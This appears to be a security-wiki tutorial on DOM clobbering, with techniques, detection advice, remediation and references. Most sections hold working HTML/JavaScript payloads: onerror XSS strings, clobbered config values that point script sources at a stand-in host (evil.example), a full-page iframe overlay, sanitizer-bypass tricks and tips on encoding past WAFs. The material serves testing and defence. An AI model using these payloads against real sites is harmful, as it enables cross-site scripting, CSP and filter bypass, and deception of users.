---
title: DOM Clobbering
---

# DOM Clobbering

---

## Description

Browsers have a quirky, decades-old habit - if an HTML element has an `id` or `name` attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (`document.myForm` instead of `document.getElementById('myForm')`).

**The problem**: JavaScript code often assumes a variable like `window.config` or `x.attributes` will contain whatever the developer intended - a real config object, a real attributes list. It usually never occurs to the developer that an attacker who can inject *plain HTML* (no `<script>` tag needed) could plant an element with that exact `id`, and silently replace what that variable points to.

That's "clobbering" - you overwrite (clobber) an existing JavaScript variable using nothing but HTML. No script execution is required to pull it off; the browser does the wiring for you automatically. This makes it a powerful bypass technique: it works even on pages with a strict Content-Security-Policy that blocks all inline scripts, because your payload is never a script - it's just tags.

Once you've clobbered a variable the app trusted, the impact depends on what that variable was used for: it can lead to XSS, open redirects, or the app's own logic doing something it shouldn't.

## Attack Surfaces

Anywhere the app lets you inject raw HTML - even in a place that seems harmless - is a potential entry point, because clobbering doesn't need `<script>` to work:

- User-controlled HTML injection points
- Comment sections
- Profile fields
- Rich text editors
- DOM sinks using global variables
- window.x
- document.x
- Dynamic script loading
- script.src = config.url
- Form handling logic
- document.forms[...]
- Third-party scripts relying on global variables
- Legacy JavaScript codebases

## Exploitation and Bypassing defenses (using encoding and obfuscation)

#### 1. Triggering XSS

Consider the following code:

```html
<html>
<head>
</head>
<body>
	<a id='asd' href='http://url1.com'>
	<a id='asd' href='http://url2.com' name='spider'>
</body>
</html>
```

**What happens here, in order:**

1. Two elements share the same `id="asd"`. When more than one element shares an `id`, the browser doesn't pick one - `window.asd` becomes a collection containing both.
2. The second element also has `name='spider'`. That lets you reach it specifically, as `window.asd.spider`, instead of getting the whole collection.
3. Check this in the browser console:

```jsx
window.asd
// → HTMLCollection(2)
window.asd.spider
// → the second <a> tag itself
window.asd.spider.toString()
// → "http://url2.com" (browsers stringify an anchor element to its href value)
```

**Why this matters:** if any app code does something like `someUrl = window.asd.spider` and then uses `someUrl` in a way that gets rendered or evaluated, you've smuggled in a value from an `href` you fully control. Weaponized version:

```jsx
<a id='asd' name='spider' href='cid:aaa" onerror="alert(1)'>
```

When this gets stringified and dropped into an attribute context downstream, the injected `onerror="alert(1)"` can fire - turning a config-read into XSS.

#### 2. Global Variable Clobbering

Inject an element whose `id`/`name` matches a global variable so `window.varName` points to attacker-controlled DOM instead of the real object.

Example:

```jsx
<form id="config"><input name="url" value="//evil.example/x.js"></form>
<script>
console.log(window.config); // logs your <form> element, not the app's real config object
</script>
```

If the app's own code does `window.config.url`, it now gets `"//evil.example/x.js"` instead of the trusted value it expected.

#### 3. Property Clobbering

Same idea, but instead of clobbering a whole variable, you shadow a *property* the app expects an object to have - like `.action` on a form.

Example:

```jsx
<form id="f">
  <input name="action" value="https://evil.example">
</form>
<script>
console.log(f.action);
// A form's real .action property is normally the submit URL —
// but a child <input name="action"> can shadow it, so this may resolve
// to the input element instead of the form's actual action URL.
</script>
```

#### 4. Function Clobbering

If code expects a global *function* to exist (like a `sanitize()` helper), and you clobber that name with a DOM element instead, calling it as a function will throw or silently fail - breaking whatever security check depended on it.

Example:

```jsx
<form id="sanitize"></form>
<script>
// The app expected window.sanitize to be a function it could call.
console.log(window.sanitize); // logs the <form> element instead — calling sanitize() now breaks
</script>
```

#### 5. DOM-Based XSS via Clobbering

Chain the above into an actual DOM XSS: clobber a variable that later gets written into `innerHTML`.

Example:

```jsx
<form id="cfg">
  <input name="html" value="<img src=x onerror=alert(1)>">
</form>
<script>
document.getElementById('id_name').innerHTML = cfg.html.value;
// cfg.html.value is fully attacker-controlled, and it's about to become live HTML
</script>
```

#### 6. URL / Resource Manipulation

Override variables later used in `script.src`, `iframe.src`, `img.src`, or redirects so the app loads attacker-chosen resources.

Example:

```jsx
<form id="settings">
  <input name="cdn" value="//evil.example/payload.js">
</form>
<script>
s.src = settings.cdn.value; // the app thinks this is a trusted CDN URL
</script>
```

#### 7. Collection Clobbering

If the app expects `document.forms.login` to be a single form, but you inject two forms with the same `name`, it becomes a collection instead of one element. Code that assumed a single object (e.g. calling `.submit()` directly) may now break, misbehave, or hit an unexpected code path.

Example:

```jsx
<form name="login"></form>
<form name="login"></form>
<script>
console.log(document.forms.login); // an HTMLCollection of 2, not a single form
</script>
```

#### 8. Filter Bypass via Attribute Clobbering

This is the trick worth understanding well, because it defeats client-side sanitizers directly. Say the app has JavaScript that loops through an element's attributes to strip dangerous ones:

```jsx
let el = document.getElementById("target");
for (let i = 0; i < el.attributes.length; i++) {
  console.log(el.attributes[i].name);
}
```

This assumes `el.attributes` is always the browser's real, built-in attribute list. But `.attributes` is just a property name - and property names can be clobbered like anything else:

```html
<form id="target">
  <input name="attributes">
</form>
```

Now `document.getElementById("target").attributes` resolves to the injected `<input>` instead of the real attribute list. The loop above either breaks or iterates over nothing - either way, whatever filtering it was supposed to do never runs. The same trick works against other property names filters commonly rely on: `.tagName`, `.nodeName`, `.parentNode`.

```html
<form id="x"></form>
<form id="y">
  <input name="nodeName" />
</form>
<script>
console.log(document.getElementById("x").nodeName) // "FORM" — normal, untouched
console.log(document.getElementById("y").nodeName) // "[object HTMLInputElement]" — clobbered
</script>
```

**Variations to try if the first attempt doesn't land:**

- Swap `id` for `name`, or try both together
- Nest the clobbering element inside another (`<form name=config><input name=url ...>`)
- Try different casing (`CONFIG`, `Config`) in case the app's lookup is case-sensitive in a way that helps you
- HTML-entity or Unicode-encode parts of your payload if a WAF or filter is blocking the literal string

#### 9. Clobbering Forms

It’s possible to add **new entries inside a form** just by **specifying the `form` attribute** inside some tags. You can use this to **add new values inside a form** and to even add a new **button** to **send it** (clickjacking or abusing some `.click()` JS code):

```html

<!--Add a new attribute and a new button to send-->
<textarea form="id-other-form" name="info">
";alert(1);//
</textarea>
<button form="id-other-form" type="submit" formaction="/edit" formmethod="post">
  Click to send!
</button>
```

This lets you inject a brand-new field into an existing form, and even add your own submit button pointing at a different action/method - useful for clickjacking-style tricks or smuggling extra parameters into a legitimate form submission.

## Advanced Attack Scenarios

#### **1. Inject `<iframe>` to Hijack UI**

```html
<div id="a1"></div>
<script>
a1.innerHTML = `<iframe id="foo" src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"></iframe>`;
</script>
```

If your injected HTML reaches an `innerHTML` sink, you're not limited to clobbering - you can paint a full-page iframe over the real content, effectively taking over what the user sees.

#### 2. Override Submit Behavior

```html
Use to Override submit Behavior
<div id="a2"></div>
<script>
a2.innerHTML = `<form id="submit" action="javascript:alert('Submit hijacked')"></form>`;
submit.submit(); // Triggers alert
</script>
```

#### 3. Manipulating History API

```jsx
<div id="a4"></div>
<script>
a4.innerHTML = `<form id="history"></form>`;
history.pushState({}, '', '/clobbered'); // "history" is now your form element, not the real History API object
</script>
```

If any later code expects `history` to be the browser's real History API and calls a method on it, it will break or misbehave, since it's now pointing at your form.

#### 4. Sandbox Escape via form Clobbering

```jsx
<iframe sandbox id="a8"></iframe>
<script>
a8.contentWindow.document.write('<form id="window"></form><script>console.log(window.top)//</script>');
</script>
```

## Detection Techniques

#### Manual

Three things to look for while reading source code or testing a target:

1. **Code that reads a global variable without checking its type.** Look for patterns like `var x = window.foo` where nothing verifies `foo` is actually the expected object before using it.
2. **Any point where you can inject raw HTML**, even something as simple as `<h1>foobar</h1>` landing unescaped in the page. You don't need script execution to prove clobbering is possible - just HTML injection.
3. **Filters that loop over DOM properties**, such as:

```jsx
for (let i = 0; i < element.attributes.length; i++) {
  let attr = element.attributes[i];
  if (isBlacklisted(attr.name)) {
    element.removeAttribute(attr.name);
  }
}
```

Any loop like this is a candidate for the `.attributes` clobbering bypass shown above.

**Practical workflow:** find your HTML injection point, then open the browser console and try `window.<candidate-name>` for names you'd expect the app to use (`config`, `settings`, `app`, `sanitize`, etc.) after injecting a simple `<form id="candidate-name">`. If it resolves to your form instead of `undefined`, you've confirmed the clobbering primitive works - now trace where that variable is actually used in the app's code to figure out real impact.

#### Automated

- **Burp Suite's DOM Invader** (built-in extension)  purpose-built for finding DOM Clobbering and DOM XSS, flags clobberable sinks automatically as you browse
- **Chrome DevTools**  manually inspect `window` object properties after injecting test payloads, to confirm what's clobbered and what isn't

## Impact

- **Cross-Site Scripting (XSS):** a clobbered variable that feeds into `innerHTML`, `eval()`, or a script `src` attribute executes attacker-controlled markup or code
- **Open Redirect:** clobbering a variable later used to build a redirect (`location.href = config.redirectUrl`) sends victims to an attacker-chosen domain
- **CSP Bypass:** this is often the headline impact: your payload is pure HTML, no `<script>` tag involved, so a strict Content-Security-Policy that blocks inline scripts does nothing to stop it
- **Security Filter Bypass:** clobbering `.attributes`, `.nodeName`, or similar properties breaks client-side sanitizers that loop over DOM properties, letting other payloads through unfiltered
- **UI Redress / Clickjacking-style attacks:** injected iframes or hijacked submit handlers can trick users into interacting with attacker content while believing it's the real page
- **Third-Party Library Risk:** even a clean, well-written first-party app can be vulnerable purely because a library it loads relies on an unchecked global variable - meaning the app doesn't need its own bug, just an HTML injection point anywhere on the page

## Remediation

- **Never trust a global variable exists or is the right type:** always check with something like `typeof x === 'function'` or `x instanceof HTMLElement === false` before using a value pulled from `window.x` or `document.x`
- **Explicitly declare variables** with `let`/`const` and a concrete value, instead of relying on whatever the browser's automatic element-to-global mapping happens to produce
- **Freeze critical config objects** with `Object.freeze()` so they can't be silently overwritten later in the page's lifecycle
- **Reference elements explicitly:** use `document.getElementById('config')` rather than relying on the implicit `window.config` mapping, so there's no ambiguity about what you're getting
- **Sanitize `id` and `name` attributes** out of user-supplied HTML wherever full HTML sanitization isn't otherwise happening - these two attributes are what drive nearly every clobbering technique above
- **Don't rely on CSP alone** - CSP stops inline `<script>` execution, but it does nothing to stop clobbering itself, since the payload is never a script; pair CSP with real JS-side type-checking
- **Prefer `textContent` over `innerHTML`** wherever you're not intentionally rendering HTML, and avoid property-iteration loops (like looping `.attributes`) that can be shadowed by attacker-controlled elements
- **Flag legacy vanilla-JS code during review** - modern frameworks like React and Vue don't expose the raw DOM-to-global mapping the same way, so hand-written older JS is disproportionately at risk and worth extra scrutiny

## Tools

- Burp Suite (DOM Invader)
- Chrome DevTools

## Good to Read:

- [https://hackerone.com/reports/308158](https://hackerone.com/reports/308158)
- [https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94](https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94)
- [https://securitymb.github.io/xss/1/?xss=<h2>Hello from terjanq! %3A](https://securitymb.github.io/xss/1/?xss=%3Ch2%3EHello%20from%20terjanq!%20%3A))%3C%2Fh2%3E
- [https://portswigger.net/research/bypassing-csp-via-dom-clobbering](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [https://github.com/ridpath/dom-clobbering-cheatsheet](https://github.com/ridpath/dom-clobbering-cheatsheet)

## References

- [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [https://medium.com/@ibm_ptc_security/dom-clobbering-baa55c208bce](https://medium.com/@ibm_ptc_security/dom-clobbering-baa55c208bce)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM Clobbering](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering)